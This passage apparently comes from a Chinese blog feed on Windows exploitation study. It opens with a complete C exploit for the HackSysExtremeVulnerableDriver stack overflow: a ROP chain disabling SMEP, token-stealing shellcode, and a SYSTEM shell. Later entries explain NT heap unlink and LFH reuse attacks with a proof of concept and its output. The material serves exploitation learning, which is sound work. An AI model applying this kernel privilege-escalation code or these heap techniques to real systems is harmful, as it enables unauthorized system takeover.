class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span></span></span><br><span class="line"><span class="comment">// IOCTL 码：0x222003 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEVD_IOCTL_STACK_OVERFLOW 0x222003</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, </span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, </span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, </span><br><span class="line">  <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x81</span>, <span class="number">0xCB</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RCX_RET 0x2079ac</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET 0x201862</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET 0x3d0dea</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_R8_RET 0x201861</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RCX_RET 0x3a0397</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_rax_qword_ptr_rcx_ret 0x32c1b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> add_rax_qword_ptr_rcx_0xa0_ret 0x649ce1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_byte_ptr_rax_cl_ret 0x49cadd</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET 0x20003e</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HANDLE hDevice;</span><br><span class="line">    DWORD bytesReturned;</span><br><span class="line">    BOOL success;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 获取驱动句柄</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Opening Driver...\n&quot;</span>);</span><br><span class="line">    hDevice = CreateFileA(</span><br><span class="line">        DEVICE_NAME,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open driver! Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Driver opened successfully!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 准备内存存放 Shellcode</span></span><br><span class="line">    LPVOID lpPayload = VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="keyword">sizeof</span>(shellcode),</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!lpPayload) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to allocate memory for shellcode!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 把 Shellcode 复制进去</span></span><br><span class="line">    <span class="built_in">memcpy</span>(lpPayload, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Shellcode located at: 0x%p\n&quot;</span>, lpPayload);</span><br><span class="line">  </span><br><span class="line">    LPVOID userBuffer = VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0x900</span>,</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(userBuffer, <span class="string">&#x27;\x41&#x27;</span>, <span class="number">0x818</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernelbase=GetKernelModuleAddress(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ExpAllocatePoolWithTagFromNode=kernelbase+<span class="number">0x2BC81F</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> memmove=kernelbase+<span class="number">0x413540</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> MiGetPteAddress=kernelbase+<span class="number">0x298780</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pte_addr=(<span class="number">0xFFFFF78000000000</span> &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7FFFFFFFF8</span>;</span><br><span class="line">    DWORD64* rop = (DWORD64*)((DWORD64)userBuffer + <span class="number">0x818</span>);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0xb50ef8</span> ^ (<span class="number">1UL</span> &lt;&lt; <span class="number">20</span>) ^ (<span class="number">1UL</span> &lt;&lt; <span class="number">21</span>);</span><br><span class="line">    *(rop + index++) = MOV_CR4_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = POP_RAX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = pte_addr+<span class="number">0x7</span>;</span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = MiGetPteAddress+<span class="number">0x13</span><span class="number">-0xa0</span>;</span><br><span class="line">    *(rop + index++) = add_rax_qword_ptr_rcx_0xa0_ret+kernelbase; <span class="comment">//add rax, [rcx+0xa];ret;</span></span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0</span>;</span><br><span class="line">    *(rop + index++) = mov_byte_ptr_rax_cl_ret+kernelbase;</span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0xFFFFF78000000000</span>+<span class="number">0x720</span>;</span><br><span class="line">    *(rop + index++) = POP_RDX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = (DWORD64)shellcode;</span><br><span class="line">    *(rop + index++) = POP_R8_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0x200</span>;</span><br><span class="line">    *(rop + index++) = memmove;</span><br><span class="line">    *(rop + index++) = RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0xFFFFF78000000000</span>+<span class="number">0x720</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering Stack Overflow...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    Buffer Size: %d\n&quot;</span>, <span class="number">0x900</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    Overwriting RET with: 0x%p\n&quot;</span>, lpPayload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 发送 IOCTL 触发漏洞</span></span><br><span class="line">    success = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        HEVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">        userBuffer,</span><br><span class="line">        <span class="number">0x900</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] DeviceIoControl failed! Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Payload sent!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 此时已经是 System 权限，再创建的子进程也是 System</span></span><br><span class="line">    CreateProcessA(<span class="literal">NULL</span>, <span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    CloseHandle(hDevice);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 学习（三）</title>
      <link href="/2025/11/25/2025-11-25-learning_windows_pwn_3/"/>
      <url>/2025/11/25/2025-11-25-learning_windows_pwn_3/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p>查看ntdll的版本号:<code>lm v m ntdll</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Information from resource tables:</span><br><span class="line">    CompanyName:      Microsoft Corporation</span><br><span class="line">    ProductName:      Microsoft® Windows® Operating System</span><br><span class="line">    InternalName:     ntdll.dll</span><br><span class="line">    OriginalFilename: ntdll.dll</span><br><span class="line">    ProductVersion:   10.0.22621.4541</span><br><span class="line">    FileVersion:      10.0.22621.4541 (WinBuild.160101.0800)</span><br><span class="line">    FileDescription:  NT Layer DLL</span><br><span class="line">    LegalCopyright:   © Microsoft Corporation. All rights reserved.</span><br></pre></td></tr></table></figure><h2 id="NT-heap下free合并堆块时的unlink"><a href="#NT-heap下free合并堆块时的unlink" class="headerlink" title="NT heap下free合并堆块时的unlink"></a>NT heap下free合并堆块时的unlink</h2><p>函数调用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">用户 / API / CRT</span><br><span class="line">    ↓</span><br><span class="line">HeapFree / LocalFree / GlobalFree / free / new/delete 等</span><br><span class="line">    ↓</span><br><span class="line">RtlFreeHeap（ntdll）</span><br><span class="line">    ↓</span><br><span class="line">RtlpFreeHeapInternal</span><br><span class="line">    ↓</span><br><span class="line">具体堆后端（传统 NT Heap / 段式堆 / LFH / VS 等）</span><br></pre></td></tr></table></figure><p>初始HEAP状态假设如下：</p><p><img src="/image/2025-11-25-learning_windows_pwn_3/1765101500542.png" alt="1765101500542"></p><p>释放 <code>Q</code> -&gt; <code>ListHint</code> 指向 <code>Q</code>。</p><p><img src="/image/2025-11-25-learning_windows_pwn_3/1765101531001.png" alt="1765101531001"></p><p>释放 <code>S</code> -&gt; <code>ListHint</code> 指向 <code>S</code>，<code>S-&gt;Flink</code> 指向 <code>Q</code>。利用 NT Heap 的 LIFO 特性，将 <code>Q</code> 从链表头部（Head）挤到第二个位置（Internal Node）。</p><p><img src="/image/2025-11-25-learning_windows_pwn_3/1765101545166.png" alt="1765101545166"></p><p>利用溢出或 UAF 修改 <code>Q</code> 的 <code>_LIST_ENTRY</code>。</p><ul><li><code>Q-&gt;Flink = TargetAddr - Offset</code></li><li><code>Q-&gt;Blink = TargetAddr</code></li><li>TargetAddr上必须有Q的地址</li></ul><p><img src="/image/2025-11-25-learning_windows_pwn_3/1765101557249.png" alt="1765101557249"></p><p>触发合并 (Trigger Coalesce)</p><ul><li>操作 ：释放堆块 <code>P</code>（位于 <code>Q</code> 之前的相邻块）。</li><li>逻辑 ：堆管理器发现 <code>P</code> 释放，且后向相邻块 <code>Q</code> 也是空闲的，决定将 <code>Q</code> 从 FreeList 中移除（Unlink）并与 <code>P</code> 合并。</li><li>调用函数 ：<code>RtlpHeapRemoveListEntry(Q)</code></li></ul><p>在 <code>RtlpHeapRemoveListEntry</code> 函数内部，会按顺序进行以下检查：</p><p>检查 A：Bucket 头部节点检查 (Head Check)</p><ul><li>逻辑 ：检查 <code>slot == Node</code>，即当前要移除的 <code>Q</code> 是否是 Bucket 的头部节点（ListHint 指向的节点）。</li><li>情况 ：</li><li>如果 <code>Q</code> 是头部：系统会尝试将 <code>Q-&gt;Flink</code>（我们伪造的攻击地址）作为新的 Bucket 头部写入堆元数据。这通常会导致堆元数据损坏或崩溃。</li><li>当前情况 ：由于我们在第一步多释放了 <code>S</code>，<code>Q</code> 此时不是头部节点。</li><li>结果 ： 绕过此检查 ，进入常规双向链表移除逻辑。</li></ul><p>检查 B：Safe Unlink 完整性检查</p><ul><li><p>逻辑 ：检查双向链表的一致性。</p></li><li><p>验证 <code>Q-&gt;Flink-&gt;Blink == Q</code></p></li><li><p>验证 <code>Q-&gt;Blink-&gt;Flink == Q</code></p></li><li><p>当前情况 ：</p></li><li><p><code>Q-&gt;Flink</code> 指向 <code>Target - Offset</code>，其 <code>Blink</code> 字段正好指向 <code>Q</code>。</p></li><li><p><code>Q-&gt;Blink</code> 指向 <code>Target</code>，其 <code>Flink</code> 字段正好指向 <code>Q</code>。</p></li><li><p>结果 ：堆管理器认为这是一个合法的链表节点。</p></li><li><p>检查通过后，执行链表移除操作：</p><ul><li><code>Q-&gt;Blink-&gt;Flink = Q-&gt;Flink</code>  &#x3D;&gt;  <code>*Target = Target - Offset</code></li><li><code>Q-&gt;Flink-&gt;Blink = Q-&gt;Blink</code>  &#x3D;&gt;  <code>*(Target - Offset + 8) = Target</code></li></ul></li></ul><p><img src="/image/2025-11-25-learning_windows_pwn_3/1765101569247.png" alt="1765101569247"></p><p>善后与软性失败 (Soft Fail)</p><ul><li>操作 ：<code>P</code> 与 <code>Q</code> 合并成 <code>NewBlock</code>，系统尝试将其插入 FreeList。</li><li>调用函数 ：<code>RtlpInsertFreeBlock(NewBlock)</code></li></ul><p>检查 ：插入时的一致性检查</p><ul><li>逻辑 ：在将 <code>NewBlock</code> 插入到相邻节点（例如 <code>A</code>）之前，检查 <code>A</code> 的反向指针是否正确。</li><li>验证 <code>A-&gt;Blink-&gt;Flink == A</code>。</li><li>当前情况 ：</li><li><code>A-&gt;Blink</code> 依然指向旧的 <code>Q</code> 地址。</li><li>但是 <code>Q</code> 的内容已经被我们在 Unlink 阶段修改了（或者 Q 现在已经是 NewBlock 的一部分，数据变了）。</li><li><code>Q-&gt;Flink</code> 不再指向 <code>A</code>。</li><li>结果 ： 检查失败 。</li></ul><p>后果：触发软性失败</p><ul><li>在 传统 NT Heap 中，这种检查失败调用的是 <code>RtlpLogHeapFailure</code>。</li><li>它会记录错误，并 中断当前的插入操作 。</li><li>但是，它不会终止进程 （Abort），这就是所谓的  Soft Fail 。</li></ul><h2 id="reuse-attack（Nt-Heap-LFH-堆）"><a href="#reuse-attack（Nt-Heap-LFH-堆）" class="headerlink" title="reuse attack（Nt Heap LFH 堆）"></a>reuse attack（Nt Heap LFH 堆）</h2><p>假设有一个 Use after free 的漏洞，但因为 LFH 的随机性，导致无法预测下一个 chunk 会在哪，使得很难进行堆布局。这时可以采用填充 <code>Userblock</code> 的方式，即先分配完所有的 LFH 堆块再 free 掉其中一块，那么下次分配的堆块一定与漏洞堆块是同一个堆块。</p><p><img src="/image/2025-11-25-learning_windows_pwn_3/1764141194132.png" alt="1764141194132"></p><p>PoC</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义分配次数，足够大以正好填满 LFH 的 UserBlock 并激活 LFH</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_COUNT 175 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_SIZE 0xF0 <span class="comment">// 0xF0 + 0x10 (Header) = 0x100 (256 bytes) Bucket</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1. 创建一个私有堆，模拟干净的环境</span></span><br><span class="line">    HANDLE hHeap = HeapCreate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hHeap) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[ALLOC_COUNT] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Phase 1: Spraying chunks to activate LFH and fill UserBlocks...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 堆喷射 (Heap Spraying) / 填充</span></span><br><span class="line">    <span class="comment">// 前 ~18 次分配会激活 LFH，后续分配会填充 UserBlock</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ALLOC_COUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        chunks[i] = HeapAlloc(hHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">        <span class="comment">//printf(&quot;    Allocated chunks[%d]: %p\n&quot;, i, chunks[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Allocated %d chunks. LFH should be active and Blocks filled.\n&quot;</span>, ALLOC_COUNT);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> victim_index = <span class="number">30</span>;</span><br><span class="line">    <span class="type">void</span>* victim_addr = chunks[victim_index];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Phase 2: Freeing one specific chunk (Index %d) at %p\n&quot;</span>, victim_index, victim_addr);</span><br><span class="line"></span><br><span class="line">    HeapFree(hHeap, <span class="number">0</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Phase 3: Allocating a new chunk of size 0x%X...\n&quot;</span>, CHUNK_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* attacker_chunk = HeapAlloc(hHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Attacker chunk address: %p\n&quot;</span>, attacker_chunk);</span><br><span class="line">    HeapDestroy(hHeap);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Phase 1: Spraying chunks to activate LFH and fill UserBlocks...</span><br><span class="line">[+] Allocated 175 chunks. LFH should be active and Blocks filled.</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">[*] Phase 2: Freeing one specific chunk (Index 30) at 000001C4BAAB4570</span><br><span class="line">[*] Phase 3: Allocating a new chunk of size 0xF0...</span><br><span class="line">[+] Attacker chunk address: 000001C4BAAB4570</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 学习（二）</title>
      <link href="/2025/10/07/2025-10-7-learning_windows_pwn_2/"/>
      <url>/2025/10/07/2025-10-7-learning_windows_pwn_2/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="NT-Heap"><a href="#NT-Heap" class="headerlink" title="NT Heap"></a>NT Heap</h2><p>NT_Heap可以分为两个部分</p><ol><li>back_end, 后端分配器是主要的堆管理结构, 负责大多数内存管理操作</li><li>front_end, 前端分配器为了提高小块内存分配的速度, 对高频小内存分配进行优化, Windows 使用 <strong>LFH(Low Fragmentation Heap)</strong> 作为主要的前端分配器</li></ol><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759824981718.png" alt="1759824981718"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span>* ptr[<span class="number">30</span>] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    HANDLE hHeap = HeapCreate(<span class="number">0</span>, <span class="number">0x10000</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i] = HeapAlloc(hHeap, <span class="number">0</span>, <span class="number">0xF0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] chunk[%02d] address is: %p\n&quot;</span>, i, ptr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[+] chunk[00] address is: 000002C55E500860</span><br><span class="line">[+] chunk[01] address is: 000002C55E500960</span><br><span class="line">[+] chunk[02] address is: 000002C55E500A60</span><br><span class="line">[+] chunk[03] address is: 000002C55E500B60</span><br><span class="line">[+] chunk[04] address is: 000002C55E500C60</span><br><span class="line">[+] chunk[05] address is: 000002C55E500D60</span><br><span class="line">[+] chunk[06] address is: 000002C55E500E60</span><br><span class="line">[+] chunk[07] address is: 000002C55E500F60</span><br><span class="line">[+] chunk[08] address is: 000002C55E501060</span><br><span class="line">[+] chunk[09] address is: 000002C55E501160</span><br><span class="line">[+] chunk[10] address is: 000002C55E501260</span><br><span class="line">[+] chunk[11] address is: 000002C55E501360</span><br><span class="line">[+] chunk[12] address is: 000002C55E501460</span><br><span class="line">[+] chunk[13] address is: 000002C55E501560</span><br><span class="line">[+] 